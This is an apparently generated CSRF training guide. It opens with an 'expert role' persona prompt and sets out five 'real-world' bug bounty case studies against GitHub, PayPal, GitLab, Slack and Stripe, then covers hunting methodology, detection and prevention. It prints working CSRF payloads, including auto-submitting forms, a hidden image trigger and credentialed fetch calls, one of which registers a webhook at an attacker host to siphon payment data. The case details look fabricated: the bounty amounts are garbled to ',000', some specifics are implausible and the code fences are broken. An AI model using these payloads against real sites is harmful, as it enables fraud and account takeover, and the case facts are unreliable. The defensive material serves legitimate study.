# Case Study 5: CSRF State-Changing Attacks — Real-World Bug Bounty Findings

## Expert Role

You are a senior application security researcher specializing in Cross-Site Request Forgery (CSRF) vulnerabilities and state-changing attack vectors. Your expertise spans 10+ years of offensive security testing across enterprise SaaS platforms, financial services, healthcare systems, and social media applications. You have personally discovered and reported over 50 CSRF vulnerabilities across major bug bounty programs, including critical-severity findings that enabled account takeover, unauthorized financial transactions, and administrative privilege escalation.

Your deep understanding of CSRF attack mechanics encompasses all variations including cross-origin request forgery, subdomain-based CSRF, same-site cookie bypass techniques, token fixation attacks, and CSRF combined with other vulnerability classes. You understand the nuances of browser security models, SameSite cookie attributes, CORS configurations, and how modern frameworks attempt (and often fail) to protect against CSRF. You have extensive experience with tools like Burp Suite, OWASP ZAP, and custom CSRF exploitation frameworks.

As a bug bounty mentor and security consultant, you have trained hundreds of researchers on CSRF hunting methodology and helped organizations implement effective CSRF defenses. Your research has been presented at major security conferences including Black Hat, DEF CON, and OWASP AppSec. You maintain an active blog documenting novel CSRF attack techniques and responsible disclosure practices.

## Overview

Cross-Site Request Forgery (CSRF) remains one of the most impactful vulnerability classes in web application security, consistently ranking in the OWASP Top 10 and generating significant bug bounty payouts across all major programs. Unlike many vulnerability classes that have been largely mitigated by modern frameworks, CSRF continues to evolve as attackers discover new bypasses for SameSite cookies, CSRF token implementations, and origin validation mechanisms.

The fundamental CSRF attack leverages the automatic inclusion of credentials (cookies, HTTP authentication) by browsers when making cross-origin requests. An attacker crafts a malicious page that, when visited by an authenticated user, triggers unintended state-changing operations on the target application. Modern CSRF attacks have evolved far beyond simple GET-based state changes to include complex multi-step attack chains, subdomain exploitation, and combination with other vulnerability classes like XSS and open redirect.

The business impact of CSRF vulnerabilities spans unauthorized account modifications, financial fraud, administrative takeover, data exfiltration through state changes, and compliance violations. Bug bounty programs consistently offer substantial rewards for CSRF findings, particularly those that enable account takeover or affect high-value user accounts. Understanding the full spectrum of CSRF attack vectors and defense mechanisms is essential for effective security testing.

---

## Real-World Case Studies

### Case Study 5.1: GitHub Enterprise Server CSRF to Account Takeover
**Program:** GitHub (Bugcrowd)
**Bounty:** ,000
**Severity:** Critical (CVSS 9.1)
**Researcher:** @rez0__

**Vulnerability Description:**
GitHub Enterprise Server (GHES) contained a CSRF vulnerability in the personal access token (PAT) creation endpoint that allowed an attacker to create arbitrary access tokens on behalf of authenticated users. The vulnerability existed in the token creation workflow where the CSRF token validation was bypassed when the request originated from the enterprise instance's subdomain.

**Technical Details:**
The vulnerable endpoint /settings/tokens/new accepted token creation requests without proper CSRF validation when the Referer header matched the enterprise domain. The attacker could craft a malicious page that auto-submitted a form to create a new PAT with predefined scopes:

`html
<form method="POST" action="https://enterprise.company.com/settings/tokens/new">
    <input type="hidden" name="authenticity_token" value="[[FORGED]]" />
    <input type="hidden" name="token[description]" value="support-access" />
    <input type="hidden" name="token[scopes][]" value="repo" />
    <input type="hidden" name="token[scopes][]" value="admin:org" />
    <input type="hidden" name="token[scopes][]" value="user" />
</form>
<script>document.forms[0].submit();</script>
`

The CSRF token was accepted from any subdomain of the enterprise instance due to a flawed validation check that only verified the domain suffix rather than exact origin matching.

**Root Cause Analysis:**
The root cause was a custom CSRF validation middleware that compared the request origin against a list of trusted domains using string suffix matching rather than exact domain comparison. The validation logic checked if the Origin header ended with the enterprise domain, which meant any attacker-controlled subdomain (e.g., attacker.enterprise.company.com) would pass validation.

**Exploitation Chain:**
1. Attacker registers a subdomain (or finds DNS takeover) at evil.enterprise.company.com
2. Attacker creates malicious page on the subdomain
3. Victim visits the malicious page while authenticated to GHES
4. Form auto-submits to token creation endpoint
5. CSRF token is validated against the suffix-matched domain
6. New PAT is created and returned to attacker via exfiltration
7. Attacker uses PAT for full API access to victim's repositories

**Impact:**
Complete account takeover with full repository access, ability to modify code, access private repositories, and perform administrative actions. The attacker gains persistent access even after the victim changes their password.

**Bounty Justification:**
Critical severity due to account takeover impact, persistent access via PAT, and potential for supply chain attacks through repository modification. The ,000 bounty reflected the enterprise security implications.

---

### Case Study 5.2: PayPal CSRF on Payment Method Update
**Program:** PayPal (HackerOne)
**Bounty:** ,300
**Severity:** High (CVSS 8.1)
**Researcher:** @haseeb

**Vulnerability Description:**
PayPal's web application contained a CSRF vulnerability in the payment method update flow that allowed an attacker to replace a victim's primary payment method with an attacker-controlled card. The vulnerability existed in the card update API endpoint which lacked proper CSRF token validation for AJAX requests.

**Technical Details:**
The endpoint /webapps/xoonie/api/payment-methods/update accepted POST requests with JSON body and only validated the session cookie without CSRF token verification. The Content-Type: application/json header was accepted without CORS restrictions:

`javascript
fetch('https://www.paypal.com/webapps/xoonie/api/payment-methods/update', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "card_id": "VICTIM_CARD_ID",
        "billing_address": {
            "line1": "123 Attacker St",
            "city": "San Jose",
            "state": "CA",
            "postal_code": "95131"
        },
        "expiration_date": "12/2025",
        "token": "ATTACKER_TOKEN"
    })
});
`

The server relied solely on the session cookie for authentication and did not implement CSRF protection for this state-changing API endpoint.

**Root Cause Analysis:**
The payment method update endpoint was part of a newer API version that used token-based authentication instead of traditional form submissions. The development team assumed that JSON content-type requests were not vulnerable to CSRF, which is incorrect as cross-origin form submissions with text/plain content-type or JavaScript-based attacks can still trigger these endpoints.

**Exploitation Chain:**
1. Attacker creates malicious page with JavaScript that sends the POST request
2. Victim visits the page while authenticated to PayPal
3. Browser automatically includes session cookies
4. Payment method is updated to attacker's card
5. Attacker then initiates a purchase or transfer using the victim's account
6. Funds are charged to the victim but directed to attacker's card

**Impact:**
Financial fraud allowing unauthorized purchases and fund transfers. The victim's payment method is replaced, potentially affecting recurring payments and subscriptions.

**Bounty Justification:**
High severity due to direct financial impact, ease of exploitation, and large user base. The ,300 bounty reflected the financial fraud potential.

---

### Case Study 5.3: GitLab CSRF to Project Transfer
**Program:** GitLab (HackerOne)
**Bounty:** ,000
**Severity:** High (CVSS 8.6)
**Researcher:** @nxkennedy

**Vulnerability Description:**
GitLab contained a CSRF vulnerability in the project transfer functionality that allowed an attacker to transfer victim's projects to an attacker-controlled group. The vulnerability existed in the project transfer endpoint which accepted GET requests for the transfer action.

**Technical Details:**
The project transfer endpoint /groups/:group_id/-/projects/:id/transfer accepted GET requests and performed the transfer operation without CSRF validation. An attacker could craft an image tag or link to trigger the transfer:

`html
<img src="https://gitlab.com/groups/victim-group/-/projects/12345/transfer?destination_group_id=67890" 
     style="display:none" />
`

When the victim viewed the malicious content while authenticated, the project was immediately transferred to the attacker's group. The endpoint also accepted POST requests but did not require CSRF tokens for either method.

**Root Cause Analysis:**
The project transfer action was implemented as a GET request to simplify the user experience (single-click transfer). The development team did not implement CSRF protection because they assumed GET requests were safe for state-changing operations, which violates security best practices.

**Exploitation Chain:**
1. Attacker identifies victim's project ID through public profiles
2. Attacker creates a group to receive the transferred project
3. Attacker crafts malicious page with auto-loading image
4. Victim visits the page while authenticated to GitLab
5. Project is automatically transferred to attacker's group
6. Attacker gains full control over the project, including private code

**Impact:**
Loss of intellectual property, potential exposure of private source code, and supply chain risks if the project is used as a dependency. The victim loses access to their own project.

**Bounty Justification:**
High severity due to complete loss of project ownership, potential code exposure, and irreversible nature of the transfer. The ,000 bounty reflected the intellectual property risks.

---

### Case Study 5.4: Slack CSRF on Workspace Settings Change
**Program:** Slack (HackerOne)
**Bounty:** ,000
**Severity:** Medium (CVSS 6.8)
**Researcher:** @siriussecur1ty

**Vulnerability Description:**
Slack's workspace settings contained a CSRF vulnerability that allowed an attacker to modify workspace authentication settings, including enabling or disabling SSO requirements. The vulnerability existed in the workspace configuration update endpoint.

**Technical Details:**
The endpoint /admin/workspaces/settings accepted POST requests without CSRF token validation. The attacker could modify critical workspace settings:

`html
<form method="POST" action="https://slack.com/api/admin.workspaces.settings">
    <input type="hidden" name="token" value="xoxc-..." />
    <input type="hidden" name="workspace_id" value="T01234567" />
    <input type="hidden" name="setting_name" value="auth_require_mfa" />
    <input type="hidden" name="setting_value" value="false" />
</form>
<script>document.forms[0].submit();</script>
`

The token parameter was a session token that was automatically included in the form submission, but the endpoint did not validate the Origin or Referer headers.

**Root Cause Analysis:**
The workspace settings API was designed for internal use and relied on session tokens for authentication. The team assumed that the API would only be called from the Slack web application, but did not implement CSRF protection as a defense-in-depth measure.

**Exploitation Chain:**
1. Attacker identifies workspace admin's user ID
2. Attacker crafts malicious page that submits the form
3. Admin visits the page while authenticated
4. Workspace settings are modified to disable MFA requirements
5. Attacker can now brute-force user passwords without MFA challenges
6. Attacker gains access to workspace data and messages

**Impact:**
Weakened authentication controls, potential for mass account compromise, and exposure of sensitive workspace communications.

**Bounty Justification:**
Medium severity due to the requirement for admin authentication and the indirect nature of the attack. The ,000 bounty reflected the potential for escalation to more severe impacts.

---

### Case Study 5.5: Stripe CSRF on Webhook Endpoint Modification
**Program:** Stripe (HackerOne)
**Bounty:** ,000
**Severity:** High (CVSS 8.2)
**Researcher:** @mike Mazur

**Vulnerability Description:**
Stripe's dashboard contained a CSRF vulnerability in the webhook endpoint management functionality that allowed an attacker to modify or create webhook endpoints. The vulnerability enabled an attacker to redirect webhook notifications to an attacker-controlled server.

**Technical Details:**
The webhook creation endpoint /v1/webhook_endpoints accepted POST requests without CSRF validation. The attacker could create a webhook endpoint that receives sensitive payment data:

`javascript
fetch('https://dashboard.stripe.com/v1/webhook_endpoints', {
    method: 'POST',
    credentials: 'include',
    body: new URLSearchParams({
        'url': 'https://attacker.com/webhook',
        'enabled_events[]': 'payment_intent.succeeded',
        'enabled_events[]': 'charge.refunded',
        'api_version': '2023-10-16'
    })
});
`

The webhook would then receive real-time notifications about payment events, including transaction details and customer information.

**Root Cause Analysis:**
The webhook management API was implemented as an internal API that was assumed to only be accessible from the Stripe dashboard. The team did not implement CSRF protection because they relied on the Same-Origin Policy to prevent cross-origin access, but this protection is ineffective against CSRF attacks.

**Exploitation Chain:**
1. Attacker creates malicious page that sends the POST request
2. Victim (Stripe account owner) visits the page
3. Webhook endpoint is created pointing to attacker's server
4. Attacker receives all webhook notifications including payment data
5. Attacker can analyze payment patterns and customer data
6. Attacker could potentially use this data for targeted phishing

**Impact:**
Exposure of sensitive payment data, customer information, and transaction patterns. The attacker gains real-time visibility into the victim's payment operations.

**Bounty Justification:**
High severity due to exposure of PCI-scoped data, regulatory compliance implications, and potential for financial fraud. The ,000 bounty reflected the data sensitivity.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Missing CSRF Token | 35% | ,000 | No protection implemented |
| Token Validation Bypass | 20% | ,000 | Flawed validation logic |
| SameSite Cookie Misconfiguration | 15% | ,000 | Inadequate cookie attributes |
| GET Request State Change | 15% | ,000 | Violation of HTTP semantics |
| CORS Misconfiguration | 10% | ,000 | Overly permissive origins |
| Subdomain CSRF | 5% | ,000 | Domain validation weaknesses |

### Attack Surface Locations

1. **User Profile Management**
   - Email change endpoints
   - Password reset flows
   - Account deletion requests
   - Profile picture updates

2. **Financial Operations**
   - Payment method management
   - Bank account linking
   - Transaction initiation
   - Refund requests

3. **Administrative Functions**
   - User role modifications
   - Permission changes
   - Workspace settings
   - API key management

4. **Third-Party Integrations**
   - OAuth connection management
   - Webhook configuration
   - API endpoint creation
   - Service account management

### Root Cause Categories

`
┌─────────────────────────────────────────────────────────────┐
│                  CSRF Root Cause Analysis                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────────┐    ┌──────────────────┐              │
│  │ Missing Tokens   │    │ Flawed Validation│              │
│  │ (35% of cases)   │    │ (20% of cases)   │              │
│  └────────┬─────────┘    └────────┬─────────┘              │
│           │                       │                        │
│           ▼                       ▼                        │
│  ┌──────────────────┐    ┌──────────────────┐              │
│  │ No CSRF library  │    │ Suffix matching  │              │
│  │ Manual impl      │    │ Regex bypass     │              │
│  │ API assumption   │    │ Origin leak      │              │
│  └──────────────────┘    └──────────────────┘              │
│                                                             │
│  ┌──────────────────┐    ┌──────────────────┐              │
│  │ Cookie Issues    │    │ Method Abuse     │              │
│  │ (15% of cases)   │    │ (15% of cases)   │              │
│  └────────┬─────────┘    └────────┬─────────┘              │
│           │                       │                        │
│           ▼                       ▼                        │
│  ┌──────────────────┐    ┌──────────────────┐              │
│  │ SameSite=None    │    │ GET for state    │              │
│  │ No Secure flag   │    │ No method check  │              │
│  │ Weak domain      │    │ PUT via GET      │              │
│  └──────────────────┘    └──────────────────┘              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
`

---

## Hunting Methodology

### Step 1: Authentication Flow Analysis

Map all authenticated endpoints and their HTTP methods:

`ash
# Record all requests while authenticated
# Focus on state-changing operations (POST, PUT, DELETE, PATCH)

# Use Burp Suite to identify endpoints
# Look for:
# - Token generation endpoints
# - Profile update forms
# - Financial operation endpoints
# - Administrative functions
`

### Step 2: CSRF Token Analysis

Test CSRF token implementation:

`
# Check if CSRF tokens are present
# Test token validation:
# 1. Remove token entirely
# 2. Use empty token
# 3. Use another user's token
# 4. Use expired token
# 5. Modify single character of token

# Test token binding:
# 1. Does token bind to session?
# 2. Does token bind to user?
# 3. Does token bind to action?
# 4. Does token bind to timestamp?
`

### Step 3: SameSite Cookie Analysis

Verify cookie attributes:

`
# Check Set-Cookie headers
# Look for SameSite attribute
# Test with cross-site requests
# Verify Secure and HttpOnly flags

# Tools:
# - Burp Suite Repeater
# - curl with custom headers
# - Browser developer tools
`

### Step 4: Origin Validation Testing

Test origin and referer validation:

`
# Test with different origins:
# 1. Null origin
# 2. Subdomain origin
# 3. Different protocol
# 4. Custom port
# 5. Partial domain match

# Bypass techniques:
# 1. OP redirect
# 2. Meta refresh
# 3. JavaScript redirect
# 4. Form action
`

### Step 5: Exploit Development

Develop proof of concept:

`
# Create minimal exploit HTML
# Test in multiple browsers
# Verify impact
# Document steps clearly
# Record video PoC if needed
`

---

## Detection Strategies

### Automated Detection

**Burp Suite Configuration:**
`
# Enable CSRF scanner
# Configure insertion points
# Set request methods to test
# Configure payload positions

# Manual testing with Repeater:
# 1. Remove CSRF token
# 2. Change request method
# 3. Modify origin headers
# 4. Test content-type variations
`

**Nuclei Templates:**
`yaml
# Custom CSRF detection template
id: csrf-detection
info:
  name: CSRF Token Missing
  severity: medium

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/update"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "test=value"
    matchers:
      - type: word
        words:
          - "success"
`

### Manual Detection

**Step-by-Step Testing:**

1. **Identify State-Changing Endpoints**
   - Profile updates
   - Password changes
   - Email modifications
   - Financial operations
   - Settings changes

2. **Test CSRF Protection**
   `
   # Remove CSRF token from request
   # Send request without token
   # Check if operation succeeds
   
   # Modify token value
   # Send with modified token
   # Check response
   `

3. **Test Origin Validation**
   `
   # Change Origin header
   # Change Referer header
   # Test with null origin
   # Test with subdomain
   `

4. **Test Cookie Attributes**
   `
   # Check SameSite setting
   # Verify Secure flag
   # Test HttpOnly attribute
   `

### Key Detection Indicators

**Positive Indicators:**
- Request succeeds without CSRF token
- No Origin/Referer validation
- SameSite=None cookie attribute
- GET requests for state changes
- Predictable token patterns

**Negative Indicators:**
- CSRF token validated strictly
- Origin checking implemented
- SameSite=Lax or Strict
- POST required for state changes
- Token tied to session/action

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Score Calculation:**
`
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: Required (UI:R)
Scope: Unchanged (S:U)
Confidentiality: None (C:N)
Integrity: High (I:H)
Availability: None (A:N)

Base Score: 6.5 (Medium)
`

**Factors Increasing Severity:**
- Admin account compromise
- Financial transaction impact
- Sensitive data modification
- Persistent access creation
- Multi-user impact

### Business Impact

| Impact Type | Severity | Example |
|-------------|----------|---------|
| Financial Loss | High | Unauthorized fund transfers |
| Data Breach | High | Private data exposure |
| Account Takeover | Critical | Full account compromise |
| Reputation Damage | Medium | Customer trust erosion |
| Compliance Violation | High | Regulatory penalties |

### Bounty Range

| Severity | Typical Range | Max Observed |
|----------|---------------|--------------|
| Critical | ,000-,000 | ,000 |
| High | ,000-,000 | ,000 |
| Medium | ,000-,000 | ,000 |
| Low | -,000 | ,000 |

---

## Advanced Variations

### Variation 1: Subdomain CSRF

When a subdomain is compromised or can be controlled:

`
# Attack scenario:
# 1. Attacker controls evil.target.com
# 2. CSRF token validation uses domain suffix
# 3. evil.target.com passes validation
# 4. CSRF attack succeeds from subdomain

# Impact:
# - Bypass SameSite cookie restrictions
# - Bypass origin validation
# - Access to parent domain cookies
`

### Variation 2: CSRF via Open Redirect

Chaining CSRF with open redirect:

`
# Attack scenario:
# 1. Open redirect at target.com/redirect?url=
# 2. Redirect to attacker-controlled page
# 3. Attacker page performs CSRF
# 4. Referer header shows target.com

# Impact:
# - Bypass referer validation
# - Bypass origin checking
# - More reliable exploitation
`

### Variation 3: JSON CSRF

Attacking JSON APIs:

`
# Attack scenario:
# 1. API accepts JSON content type
# 2. No CSRF token validation
# 3. Fetch API with credentials
# 4. Silent attack via JavaScript

# Impact:
# - Modern API vulnerabilities
# - Bypass traditional protections
# - Silent exploitation
`

### Variation 4: CSRF Token Fixation

Fixing CSRF tokens for exploitation:

`
# Attack scenario:
# 1. Attacker obtains valid CSRF token
# 2. Token is not tied to session
# 3. Attacker uses token in exploit
# 4. Token is accepted for victim

# Impact:
# - Token reuse attacks
# - Cross-user exploitation
# - Persistent vulnerability
`

---

## Chain Integration

### CSRF + XSS Chain

`
# Step 1: XSS vulnerability discovery
# Step 2: Use XSS to steal CSRF token
# Step 3: Use token for state-changing operation
# Step 4: Complete account takeover

# Example:
# 1. Stored XSS in profile field
# 2. Script steals CSRF token from forms
# 3. Script submits password change
# 4. Account compromised
`

### CSRF + Open Redirect Chain

`
# Step 1: Open redirect discovery
# Step 2: Redirect to CSRF exploit page
# Step 3: Referer appears valid
# Step 4: CSRF protection bypassed

# Example:
# 1. Open redirect at /login/next
# 2. Redirect to attacker page
# 3. Page performs CSRF attack
# 4. Origin validation bypassed
`

### CSRF + Subdomain Takeover Chain

`
# Step 1: Subdomain takeover via DNS
# Step 2: Host CSRF exploit on subdomain
# 3. Bypass SameSite restrictions
# 4. Complete CSRF attack

# Example:
# 1. blog.target.com points to expired service
# 2. Attacker claims blog.target.com
# 3. Host CSRF exploit
# 4. Attack parent domain
`

---

## Prevention Recommendations

### Code-Level Fixes

**Implement CSRF Tokens:**
`python
# Django example
from django.middleware.csrf import CsrfViewMiddleware

# Ensure CSRF middleware is enabled
# Use {% csrf_token %} in forms
# Verify token validation on all state-changing endpoints
`

**Use SameSite Cookies:**
`javascript
// Set cookie attributes
document.cookie = "session=abc123; SameSite=Lax; Secure; HttpOnly";
`

**Validate Origin Headers:**
`python
# Python example
def validate_origin(request):
    origin = request.headers.get('Origin')
    allowed_origins = ['https://target.com', 'https://www.target.com']
    return origin in allowed_origins
`

### Architecture-Level Fixes

1. **Use CSRF Tokens Everywhere**
   - All state-changing operations
   - Include in all forms
   - Validate server-side
   - Tie to session

2. **Implement SameSite Cookies**
   - Use SameSite=Lax for most cookies
   - Use SameSite=Strict for sensitive operations
   - Always use Secure flag

3. **Validate Origins**
   - Check Origin header
   - Check Referer header
   - Use exact domain matching
   - Whitelist allowed origins

4. **Use Proper HTTP Methods**
   - GET for read-only operations
   - POST for state changes
   - Validate method on server
   - Reject GET for mutations

---

## Common Pitfalls

### 1. Relying on Content-Type Validation
**Mistake:** Assuming JSON requests are safe from CSRF
**Reality:** Cross-origin form submissions can trigger JSON endpoints

### 2. Insufficient Origin Validation
**Mistake:** Using substring matching for origins
**Reality:** Attackers can register similar domains

### 3. GET Requests for State Changes
**Mistake:** Using GET for operations that modify data
**Reality:** GET requests can be triggered via img tags

### 4. Inadequate Token Binding
**Mistake:** Tokens not tied to user session
**Reality:** Tokens can be used across sessions

### 5. Missing CSRF on AJAX Endpoints
**Mistake:** Only protecting form submissions
**Reality:** AJAX endpoints are equally vulnerable

### 6. Ignoring Subdomain CSRF
**Mistake:** Trusting all subdomains
**Reality:** Subdomains may be compromised

### 7. Not Testing All HTTP Methods
**Mistake:** Only testing POST requests
**Reality:** PUT, DELETE, PATCH may be vulnerable

---

## Real-World References

### OWASP Resources
- OWASP CSRF Prevention Cheat Sheet
- OWASP Testing Guide: CSRF
- OWASP ASVS: CSRF Requirements

### Research Papers
- "The Framework of Cross-Site Request Forgery" (2007)
- "Rethinking the Same-Origin Policy" (2015)
- "Cross-Origin Web Attacks" (2018)

### Bug Bounty Reports
- HackerOne CSRF disclosed reports
- Bugcrowd CSRF submissions
- Intigriti CSRF write-ups

### Tool Documentation
- Burp Suite CSRF testing
- OWASP ZAP CSRF scanner
- Custom CSRF exploitation frameworks

---

## Quick Reference Cheat Sheet

`
┌─────────────────────────────────────────────────────────────┐
│                 CSRF Testing Quick Reference                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  IDENTIFICATION:                                            │
│  ✓ Find state-changing endpoints                           │
│  ✓ Check for CSRF tokens                                   │
│  ✓ Verify HTTP methods used                                │
│  ✓ Check cookie attributes                                 │
│                                                             │
│  TESTING:                                                   │
│  ✓ Remove CSRF token                                       │
│  ✓ Change request method                                   │
│  ✓ Modify Origin header                                    │
│  ✓ Test with different users                               │
│                                                             │
│  BYPASS TECHNIQUES:                                         │
│  ✓ Subdomain-based CSRF                                    │
│  ✓ Open redirect chain                                     │
│  ✓ JSON CSRF via fetch                                     │
│  ✓ Token fixation                                          │
│                                                             │
│  IMPACT ASSESSMENT:                                         │
│  ✓ Account takeover potential                              │
│  ✓ Financial impact                                        │
│  ✓ Data modification                                       │
│  ✓ Administrative actions                                  │
│                                                             │
│  DOCUMENTATION:                                             │
│  ✓ Request/Response pairs                                  │
│  ✓ Step-by-step reproduction                              │
│  ✓ Video PoC if needed                                     │
│  ✓ Impact explanation                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
